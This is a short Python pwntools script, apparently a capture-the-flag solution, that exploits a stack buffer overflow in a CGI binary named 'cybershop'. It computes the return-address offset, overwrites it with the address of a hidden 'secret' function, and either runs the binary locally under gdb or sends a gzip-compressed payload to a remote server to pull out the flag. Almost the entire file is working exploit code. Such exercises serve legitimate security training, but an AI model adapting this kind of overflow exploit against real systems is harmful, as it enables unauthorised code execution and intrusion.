import requests

from time import sleep

from gzip import compress
from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64

LOCAL_BIN = "./cybershop"
LOCAL = True
GDB = True

marys_secret_function = 0x40129f
# P.sendline(cyclic(1000))
rip_offset = cyclic_find(b"waaa")

payload = p64(marys_secret_function)
payload = b"A"*rip_offset + payload
    
if LOCAL:
    ENV = {"REQUEST_METHOD": "POST", "CONTENT_LENGTH": str(len(payload))} 
    P = process(LOCAL_BIN, env=ENV)
    if GDB:
        gdb.attach(P.pid, """
#b *(main+1299)
b *(marys_secret_function+57)
display/i $pc
c
""")
    P.send(payload)
    sleep(1)
    print(P.clean())
else:
    resp = requests.post("http://10.10.1.11:37241", data=compress(payload), headers={"Content-Encoding": "gzip"})
    i = resp.content.find(b"</html>")
    flag = resp.content[i+7:]
    log.success(flag.decode())


